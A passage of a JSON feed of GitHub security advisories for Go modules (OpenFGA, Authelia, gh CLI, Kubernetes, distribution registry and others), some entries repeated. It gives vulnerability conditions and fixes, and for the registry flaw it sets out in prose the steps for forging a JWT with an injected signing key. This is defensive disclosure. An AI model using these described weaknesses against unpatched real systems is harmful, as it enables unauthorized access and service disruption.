href=\"https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1\">https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fh4v-v779-4g2w\">https://github.com/advisories/GHSA-fh4v-v779-4g2w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fh4v-v779-4g2w",
            "title": "[github.com/bishopfox/sliver] SSRF in sliver teamserver",
            "date_modified": "2025-02-20T22:47:01.000Z",
            "date_published": "2025-02-19T21:11:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fh4v-v779-4g2w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Overview\nOpenFGA v1.8.4 or previous (Helm chart &lt; openfga-0.2.22, docker &lt; v.1.8.5) are vulnerable to authorization bypass when certain Check and ListObject calls are executed.</p>\n<p>Am I Affected?\nIf you are using OpenFGA v1.8.4 or previous, specifically under the following conditions, you are affected by this authorization bypass vulnerability:</p>\n<ul>\n<li>Calling Check API or ListObjects with a model that has a relation <a href=\"https://openfga.dev/docs/concepts#what-is-a-directly-related-user-type\">directly assignable</a> to both <a href=\"https://openfga.dev/docs/concepts#what-is-type-bound-public-access\">public access</a> AND <a href=\"https://openfga.dev/docs/concepts#what-is-a-user\">userset</a> with the <a href=\"https://openfga.dev/docs/concepts#what-is-a-type\">same type</a>, and</li>\n<li>A type bound public access tuple is assigned to an object, and</li>\n<li>userset tuple is not assigned to the same object, and</li>\n<li>Check request's user field is a userset that has the same type as the type bound public access tuple's user type</li>\n</ul>\n<p>Fix\nUpgrade to v1.8.5. This upgrade is backwards compatible.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openfga/openfga/security/advisories/GHSA-g4v5-6f5p-m38j\">https://github.com/openfga/openfga/security/advisories/GHSA-g4v5-6f5p-m38j</a></li>\n<li><a href=\"https://github.com/openfga/openfga/commit/0aee4f47e0c642de78831ceb27bb62b116f49588\">https://github.com/openfga/openfga/commit/0aee4f47e0c642de78831ceb27bb62b116f49588</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25196\">https://nvd.nist.gov/vuln/detail/CVE-2025-25196</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4v5-6f5p-m38j\">https://github.com/advisories/GHSA-g4v5-6f5p-m38j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g4v5-6f5p-m38j",
            "title": "[github.com/openfga/openfga] OpenFGA Authorization Bypass",
            "date_modified": "2025-02-19T22:39:16.000Z",
            "date_published": "2025-02-19T20:25:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g4v5-6f5p-m38j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If users are allowed to sign in via both username and email the regulation system treats these as separate login events. This leads to the regulation limitations being effectively doubled assuming an attacker using brute-force to find a user password. It's important to note that due to the effective operation of regulation where no user-facing sign of their regulation ban being visible either via timing or via API responses, it's effectively impossible to determine if a failure occurs due to a bad username password combination, or a effective ban blocking the attempt which heavily mitigates any form of brute-force.</p>\n<h3 id=\"details\">Details</h3>\n<p>This occurs because the records and counting process for this system uses the method utilized for sign in rather than the effective username attribute.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This has a minimal impact on account security, this impact is increased naturally in scenarios when there is no two-factor authentication required and weak passwords are used. This makes it a bit easier to brute-force a password.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ol>\n<li>Do not heavily modify the default settings in a way that ends up with shorter or less frequent regulation bans. The default settings effectively mitigate any potential for this issue to be exploited.</li>\n<li>Disable the ability for users to login via an email address.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26\">https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26</a></li>\n<li><a href=\"https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c\">https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24806\">https://nvd.nist.gov/vuln/detail/CVE-2025-24806</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5mf-3963-4x26\">https://github.com/advisories/GHSA-m5mf-3963-4x26</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5mf-3963-4x26",
            "title": "[github.com/authelia/authelia/v4] Authelia applies regulation separately to Username-based logins to Email-based logins",
            "date_modified": "2025-02-19T20:00:07.000Z",
            "date_published": "2025-02-19T17:47:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5mf-3963-4x26"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A bug in GitHub's Artifact Attestation CLI tool, <code>gh attestation verify</code>, may return an incorrect zero exit status when no matching attestations are found for the specified <code>--predicate-type &lt;value&gt;</code> or the default <code>https://slsa.dev/provenance/v1</code> if not specified. This issue only arises if an artifact has an attestation with a predicate type different from the one provided in the command. As a result, users relying solely on these exit codes may mistakenly believe the attestation has been verified, despite the absence of an attestation with the specified predicate type and the tool printing a verification failure.</p>\n<p>Users are advised to update <code>gh</code> to version <code>v2.67.0</code> as soon as possible.</p>\n<p>Initial report: <a href=\"https://github.com/cli/cli/issues/10418\">https://github.com/cli/cli/issues/10418</a>\nFix: <a href=\"https://github.com/cli/cli/pull/10421\">https://github.com/cli/cli/pull/10421</a></p>\n<h3 id=\"details\">Details</h3>\n<p>The gh attestation verify command fetches, loads, and attempts to verify attestations associated with a given artifact for a specified predicate type. If an attestation is found, but the predicate type does not match the one specified in the <code>gh attestation verify</code> command, the verification fails, but the program exits early.</p>\n<p>Due to a re-used uninitialized error variable, when no matching attestations are found, the relevant function returns <code>nil</code> instead of an error, causing the program to exit with a status code of <code>0</code>, which incorrectly suggests successful verification.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run <code>gh attestation verify</code> with local attestations using the <code>--bundle</code> flag and specify a predicate type with <code>--predicate-type</code> that you know will not match any of the attestations the command will attempt to verify. Confirm that the command exits with a zero status code.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users who rely exclusively on the exit status code of <code>gh attestation verify</code> may incorrectly verify an attestation when the attestation's predicate type does not match the specified predicate type in the command.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8\">https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8</a></li>\n<li><a href=\"https://github.com/cli/cli/issues/10418\">https://github.com/cli/cli/issues/10418</a></li>\n<li><a href=\"https://github.com/cli/cli/pull/10421\">https://github.com/cli/cli/pull/10421</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25204\">https://nvd.nist.gov/vuln/detail/CVE-2025-25204</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fgw4-v983-mgp8\">https://github.com/advisories/GHSA-fgw4-v983-mgp8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fgw4-v983-mgp8",
            "title": "[github.com/cli/cli/v2] `gh attestation verify` returns incorrect exit code during verification if no attestations are present",
            "date_modified": "2025-02-17T07:28:55.000Z",
            "date_published": "2025-02-14T17:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fgw4-v983-mgp8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the lack of rate limiting.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57603\">https://nvd.nist.gov/vuln/detail/CVE-2024-57603</a></li>\n<li><a href=\"https://github.com/mayswind/ezbookkeeping/issues/33\">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>\n<li><a href=\"https://hkohi.ca/vulnerability/1\">https://hkohi.ca/vulnerability/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-772m-773g-qmhc\">https://github.com/advisories/GHSA-772m-773g-qmhc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-772m-773g-qmhc",
            "title": "[github.com/mayswind/ezbookkeeping] Missing rate limit in MaysWind ezBookkeeping",
            "date_modified": "2025-02-13T22:43:45.000Z",
            "date_published": "2025-02-13T00:33:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-772m-773g-qmhc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in openshift-gitops-operator-container. The openshift.io/cluster-monitoring label is applied to all namespaces that deploy an ArgoCD CR instance, allowing the namespace to create a rogue PrometheusRule. This issue can have adverse effects on the platform monitoring stack, as the rule is rolled out cluster-wide when the label is applied.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13484\">https://nvd.nist.gov/vuln/detail/CVE-2024-13484</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-13484\">https://access.redhat.com/security/cve/CVE-2024-13484</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2269376\">https://bugzilla.redhat.com/show_bug.cgi?id=2269376</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-58fx-7v9q-3g56\">https://github.com/advisories/GHSA-58fx-7v9q-3g56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-58fx-7v9q-3g56",
            "title": "[github.com/redhat-developer/gitops-operator] OpenShift GitOps Operator Namespace Isolation Break",
            "date_modified": "2025-02-13T15:08:58.000Z",
            "date_published": "2025-01-28T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-58fx-7v9q-3g56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>\n<p>We recommend upgrading as soon as possible.</p>\n<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">7.2.1</a> and <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">8.1.1</a> are patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>N/A</p>\n<h3 id=\"references\">References</h3>\n<p>N/A</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f",
            "title": "[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v8] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain",
            "date_modified": "2025-02-12T22:01:25.000Z",
            "date_published": "2025-02-12T22:01:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>\n<p>We recommend upgrading as soon as possible.</p>\n<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">7.2.1</a> and <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">8.1.1</a> are patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>N/A</p>\n<h3 id=\"references\">References</h3>\n<p>N/A</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f",
            "title": "[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v7] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain",
            "date_modified": "2025-02-12T22:01:25.000Z",
            "date_published": "2025-02-12T22:01:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Temporal api-go library prior to version 1.44.1 did not send <code>update response</code> information to Data Converter when the proxy package within the api-go module was used in a gRPC proxy prior to transmission. This resulted in&nbsp;information contained within the <code>update response</code> field not having Data Converter transformations (e.g. encryption) applied. This is an issue only when using the UpdateWorkflowExecution APIs (released on 13th January 2025)  with a proxy leveraging the api-go library before version 1.44.1.</p>\n<p>Other data fields were correctly sent to Data Converter. This issue does not impact the Data Converter server. Data was encrypted in transit. Temporal Cloud services are not impacted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1243\">https://nvd.nist.gov/vuln/detail/CVE-2025-1243</a></li>\n<li><a href=\"https://github.com/temporalio/api-go/releases/tag/v1.44.1\">https://github.com/temporalio/api-go/releases/tag/v1.44.1</a></li>\n<li><a href=\"https://temporal.io/blog/announcing-a-new-operation-workflow-update\">https://temporal.io/blog/announcing-a-new-operation-workflow-update</a></li>\n<li><a href=\"https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b\">https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9w6-cwj4-gf4p\">https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9w6-cwj4-gf4p",
            "title": "[go.temporal.io/api] Unencrypted transmission in Temporal api-go library",
            "date_modified": "2025-02-12T19:37:53.000Z",
            "date_published": "2025-02-12T03:31:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9w6-cwj4-gf4p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Calls to <code>cng.TLS1PRF</code> don't release the key handle, producing a small memory leak every time.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf\">https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25199\">https://nvd.nist.gov/vuln/detail/CVE-2025-25199</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41\">https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-29c6-3hcj-89cf\">https://github.com/advisories/GHSA-29c6-3hcj-89cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-29c6-3hcj-89cf",
            "title": "[github.com/microsoft/go-crypto-winnative] go-crypto-winnative BCryptGenerateSymmetricKey memory leak",
            "date_modified": "2025-02-12T19:21:02.000Z",
            "date_published": "2025-02-12T19:20:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-29c6-3hcj-89cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Systems running registry version &gt; <code>3.0.0-beta.1</code> with token authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to at least <code>v3.0.0-rc.3</code></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no way to work around this issue without patching if your system requires token authentication.</p>\n<h3 id=\"references\">References</h3>\n<p>The issue lies in how the JWK verification is performed. When a JWT contains a JWK header without a certificate chain, the code only checks if the KeyID (<code>kid</code>) matches one of the trusted keys, but doesn't verify that the actual key material matches.</p>\n<p>Here's the problematic flow:</p>\n<ol>\n<li>An attacker generates their own key pair</li>\n<li>They create a JWT and include their public key in the JWK header</li>\n<li>They set the <code>kid</code> in the JWK to match one of the trusted keys' IDs (which they could potentially discover)</li>\n<li>They sign the JWT with their private key</li>\n<li>The registry only checks if the <code>kid</code> exists in the trusted keys map but then uses the attacker's public key from the JWK to verify the signature</li>\n</ol>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/distribution/distribution/security/advisories/GHSA-phw4-mc57-4hwc\">https://github.com/distribution/distribution/security/advisories/GHSA-phw4-mc57-4hwc</a></li>\n<li><a href=\"https://github.com/distribution/distribution/commit/5ea9aa028db65ca5665f6af2c20ecf9dc34e5fcd\">https://github.com/distribution/distribution/commit/5ea9aa028db65ca5665f6af2c20ecf9dc34e5fcd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24976\">https://nvd.nist.gov/vuln/detail/CVE-2025-24976</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-phw4-mc57-4hwc\">https://github.com/advisories/GHSA-phw4-mc57-4hwc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-phw4-mc57-4hwc",
            "title": "[github.com/distribution/distribution/v3] Distribution's token authentication allows to inject an untrusted signing key in a JWT",
            "date_modified": "2025-02-11T19:07:48.000Z",
            "date_published": "2025-02-11T17:57:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-phw4-mc57-4hwc"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}